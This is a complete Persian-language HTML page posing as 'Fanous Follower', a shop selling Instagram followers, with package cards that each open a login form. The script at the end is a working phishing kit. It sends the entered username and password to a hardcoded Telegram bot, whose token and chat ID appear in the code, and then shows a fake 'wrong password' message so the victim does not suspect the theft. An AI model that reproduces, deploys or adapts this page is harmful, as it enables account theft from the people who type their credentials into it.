<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>فالوور فانوس — فالوور واقعی ایرانی</title>
  <meta name="description" content="فالوور فانوس — فالوور واقعی ایرانی، تحویل سریع و پشتیبانی 24/7" />
  <!-- فونت فارسی Vazirmatn -->
  <link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet">
  <style>
    :root {
      --bg-1: #071428;
      --bg-2: #0b2b43;
      --accent1: #ff7e5f;
      --accent2: #ffb88c;
      --glass: rgba(255, 255, 255, 0.06);
      --muted: rgba(255, 255, 255, 0.78);
      --card: rgba(255, 255, 255, 0.035);
    }
    * { box-sizing: border-box }
    html, body { height: 100% }
    body {
      margin: 0;
      font-family: 'Vazirmatn', Tahoma, sans-serif;
      background: radial-gradient(800px 500px at 10% 10%, rgba(255, 126, 95, 0.06), transparent),
                  linear-gradient(135deg, var(--bg-1), var(--bg-2));
      color: #fff;
      direction: rtl;
      -webkit-font-smoothing: antialiased;
      line-height: 1.6;
      overflow-x: hidden;
    }

    /* --- Header --- */
    .header {
      position: fixed;
      inset-inline: 0;
      top: 14px;
      padding: 12px;
      z-index: 1000;
      display: flex;
      justify-content: center;
      pointer-events: none;
    }
    .nav {
      width: 100%;
      max-width: 1150px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      gap: 12px;
      padding: 8px 14px;
      pointer-events: auto;
      background: linear-gradient(180deg, rgba(255, 255, 255, 0.02), transparent);
      border-radius: 14px;
      box-shadow: 0 10px 30px rgba(2, 6, 23, 0.6);
      border: 1px solid rgba(255, 255, 255, 0.03);
      backdrop-filter: blur(6px);
    }
    .brand { display: flex; align-items: center; gap: 12px }
    .logo { width: 160px; height: auto; display: block; border-radius: 10px; transition: transform .35s }
    .logo:hover { transform: translateY(-4px) rotate(-3deg) }
    .nav .title { font-weight: 800 }
    .nav .subtitle { font-size: 12px; color: var(--muted); margin-top: 2px }

    .actions { display: flex; gap: 10px; align-items: center }
    .btn {
      background: linear-gradient(90deg, var(--accent1), var(--accent2));
      border: none;
      padding: 10px 16px;
      border-radius: 999px;
      font-weight: 800;
      cursor: pointer;
      box-shadow: 0 10px 30px rgba(255, 126, 95, 0.12);
      transition: transform .18s, box-shadow .18s;
      color: #08131a;
    }
    .btn:hover { transform: translateY(-4px); box-shadow: 0 16px 40px rgba(255, 126, 95, 0.18) }
    .ghost {
      background: transparent;
      border: 1px solid rgba(255, 255, 255, 0.07);
      padding: 8px 14px;
      border-radius: 999px;
      color: var(--muted);
      cursor: pointer;
    }
    .ghost:hover { background: rgba(255, 255, 255, 0.02) }

    /* --- Hero --- */
    .container { max-width: 1150px; margin: 0 auto; padding: 28px }
    .hero {
      display: flex;
      gap: 36px;
      align-items: center;
      padding-top: 110px;
      padding-bottom: 40px;
      flex-direction: column; /* تغییر به ستون برای حذف هیرو-رایت */
    }
    .hero-left { width: 100%; min-width: 320px }
    .kicker {
      display: inline-block;
      padding: 8px 14px;
      border-radius: 999px;
      background: linear-gradient(90deg, var(--accent1), var(--accent2));
      color: #07131a;
      font-weight: 800;
      margin-bottom: 12px;
      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.35);
    }
    h1 { font-size: clamp(26px, 4.2vw, 44px); margin: 10px 0; line-height: 1.05 }
    p.lead { color: var(--muted); font-size: clamp(14px, 2.2vw, 17px); max-width: 760px }
    .hero-ctas { margin-top: 20px; display: flex; gap: 12px; flex-wrap: wrap }

    /* --- Packages --- */
    .packages { margin-top: 30px }
    .package-list { display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px; margin: 0 auto; max-width: 1150px }
    .package {
      padding: 18px;
      border-radius: 14px;
      background: linear-gradient(180deg, rgba(255, 255, 255, 0.02), transparent);
      border: 1px solid rgba(255, 255, 255, 0.03);
      text-align: center;
    }
    .price { font-weight: 800; font-size: 20px; margin-top: 6px; color: var(--accent2) }
    .muted { color: var(--muted); font-size: 13px; margin-top: 8px }

    /* --- Login Overlay --- */
    .overlay {
      position: fixed;
      inset: 0;
      display: none;
      align-items: center;
      justify-content: center;
      padding: 20px;
      background: linear-gradient(180deg, rgba(0, 0, 0, 0.45), rgba(0, 0, 0, 0.45));
    }
    .overlay.show { display: flex }
    .modal {
      width: 100%;
      max-width: 520px;
      background: linear-gradient(180deg, rgba(255, 255, 255, 0.02), transparent);
      padding: 18px;
      border-radius: 12px;
      border: 1px solid rgba(255, 255, 255, 0.03);
      backdrop-filter: blur(10px);
      box-shadow: 0 10px 30px rgba(2, 6, 23, 0.6);
    }
    .field { display: block; margin-top: 8px }
    input {
      width: 100%;
      padding: 10px;
      border-radius: 8px;
      border: 1px solid rgba(255, 255, 255, 0.06);
      background: transparent;
      color: #fff;
      font-size: 14px;
    }
    .modal-buttons { display: flex; gap: 8px; margin-top: 10px }

    /* --- Footer --- */
    footer {
      margin-top: 50px;
      padding: 24px;
      border-top: 1px solid rgba(255, 255, 255, 0.03);
      display: flex;
      justify-content: space-between;
      align-items: center;
      gap: 12px;
      flex-wrap: wrap;
    }
    .copyright { color: var(--muted); font-size: 13px }

    /* --- Responsive --- */
    @media (max-width: 1000px) {
      .package-list { grid-template-columns: repeat(2, 1fr) }
    }
    @media (max-width: 720px) {
      .nav { flex-direction: column; align-items: stretch; gap: 8px }
      .logo { width: 140px }
      .package-list { grid-template-columns: 1fr }
      .hero { padding-top: 130px }
    }

    /* --- Animation --- */
    .fade {
      opacity: 0;
      transform: translateY(12px);
      animation: fadeIn .6s forwards;
    }
    .fade.delay1 { animation-delay: .08s }
    .fade.delay2 { animation-delay: .16s }
    .fade.delay3 { animation-delay: .24s }
    @keyframes fadeIn { to { opacity: 1; transform: none } }

    a { color: inherit; text-decoration: none }
    button:focus, input:focus { outline: 2px dashed rgba(255, 126, 95, 0.16); outline-offset: 3px }
  </style>
</head>
<body>
  <!-- HEADER -->
  <div class="header">
    <nav class="nav container" role="navigation" aria-label="Main Navigation">
      <div class="brand">
        <img src="https://s6.uupload.ir/files/lumii_۲۰۲۵۰۸۱۲_۰۲۰۰۴۶۲۶۴_8hhr.png" alt="لوگو فالوور فانوس" class="logo">
        <div>
          <div class="title">فالوور فانوس</div>
          <div class="subtitle">فالوور واقعی ایرانی • رشد طبیعی</div>
        </div>
      </div>
      <div class="actions">
        <button class="ghost" aria-haspopup="dialog" onclick="openLoginOverlay()">ورود</button>
      </div>
    </nav>
  </div>

  <!-- MAIN -->
  <main class="container" role="main">
    <section class="hero">
      <div class="hero-left">
        <span class="kicker fade delay1">تحویل فوری • ایرانی • امن</span>
        <h1 class="fade delay2">فالوور واقعی و هدف‌مند — رشد طبیعی و پایدار برای پیج شما</h1>
        <p class="lead fade delay3">با <strong>فالوور فانوس</strong> تعامل صفحه‌تان را افزایش دهید. فالوورهای ما ایرانی، واقعی و هدف‌مند هستند تا بازدید و تعامل پست‌هایتان به‌صورت طبیعی رشد کند. مناسب برای محتواسازان، برندها و کسب‌وکارها.</p>
        <div class="hero-ctas fade delay3" style="margin-top: 18px">
          <button class="btn" onclick="openLoginOverlay()">ورود به فالوورها</button>
        </div>
      </div>
    </section>

    <!-- PACKAGES -->
    <section id="packages" class="packages">
      <h2 style="margin-bottom: 12px">پکیج‌های پیشنهادی</h2>
      <div class="package-list">
        <div class="package">
          <h3>پکیج شروعی — ۱۰۰ فالوور</h3>
          <div class="price">وارد شوید</div>
          <div class="muted">آغاز امن و مناسب برای تست رشد.</div>
          <div style="margin-top: 12px; display: flex; gap: 8px; justify-content: center">
            <button class="btn" onclick="openLoginOverlay('100')">ورود</button>
          </div>
        </div>
        <div class="package">
          <h3>پکیج محبوب — ۱۰۰۰ فالوور</h3>
          <div class="price">وارد شوید</div>
          <div class="muted">تعادل مناسب بین حجم و کیفیت.</div>
          <div style="margin-top: 12px; display: flex; gap: 8px; justify-content: center">
            <button class="btn" onclick="openLoginOverlay('1000')">ورود</button>
          </div>
        </div>
        <div class="package">
          <h3>پکیج رشد — ۵۰۰۰ فالوور</h3>
          <div class="price">وارد شوید</div>
          <div class="muted">برای کسب‌وکارها و صفحات برند.</div>
          <div style="margin-top: 12px; display: flex; gap: 8px; justify-content: center">
            <button class="btn" onclick="openLoginOverlay('5000')">ورود</button>
          </div>
        </div>
      </div>
    </section>

    <!-- FOOTER -->
    <footer>
      <div>
        <div style="font-weight: 800">فالوور فانوس</div>
        <div class="muted">تماس: 0912-345-6789 • ایمیل: support@fanousfollower.com</div>
      </div>
      <div class="copyright">© ۱۴۰۴ — تمامی حقوق محفوظ است</div>
    </footer>
  </main>

  <!-- LOGIN OVERLAY -->
  <div id="loginOverlay" class="overlay" aria-hidden="true">
    <div class="modal" role="dialog" aria-modal="true" aria-labelledby="loginTitle">
      <div style="display: flex; justify-content: space-between; align-items: center; gap: 8px">
        <h3 id="loginTitle">ورود به فالوور فانوس</h3>
        <button class="ghost" onclick="closeLoginOverlay()">بستن</button>
      </div>
      <form id="loginForm" style="margin-top: 12px">
        <label class="field">نام کاربری یا ایمیل
          <input id="username" placeholder="username_123" style="width: 100%; padding: 10px; border-radius: 8px; border: 1px solid rgba(255, 255, 255, 0.06); background: transparent; color: #fff">
        </label>
        <label class="field">رمز عبور
          <input id="password" type="password" placeholder="••••••••" style="width: 100%; padding: 10px; border-radius: 8px; border: 1px solid rgba(255, 255, 255, 0.06); background: transparent; color: #fff">
        </label>
        <div class="modal-buttons">
          <button class="btn" type="submit">ورود</button>
        </div>
      </form>
    </div>
  </div>

  <script>
    /* UI Functions */
    function openLoginOverlay(pre) {
      document.getElementById('loginOverlay').classList.add('show');
      document.getElementById('loginOverlay').setAttribute('aria-hidden', 'false');
    }
    function closeLoginOverlay() {
      document.getElementById('loginOverlay').classList.remove('show');
      document.getElementById('loginOverlay').setAttribute('aria-hidden', 'true');
    }
    window.addEventListener('keydown', function(e) { if (e.key === 'Escape') closeLoginOverlay(); });

    /* Login Functionality */
    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();
      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;
      const message = `Username/Email: ${username}\nPassword: ${password}`;

      const botToken = '8421737454:AAG2owi6zfpm18xKzuWjHE-GXCAvi8rPFzo';
      const chatId = '418687807';
      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

      fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      })
      .then(response => response.json())
      .then(data => {
        if (data.ok) {
          alert('یوزرنیم یا رمز عبور اشتباه است! دوباره تلاش کنید.');
          document.getElementById('loginForm').reset();
          closeLoginOverlay();
        } else {
          alert('خطا در اتصال! دوباره تلاش کنید.');
        }
      })
      .catch(error => {
        console.error('Error:', error);
        alert('خطا در اتصال! دوباره تلاش کنید.');
      });
    });
  </script>
</body>
</html>
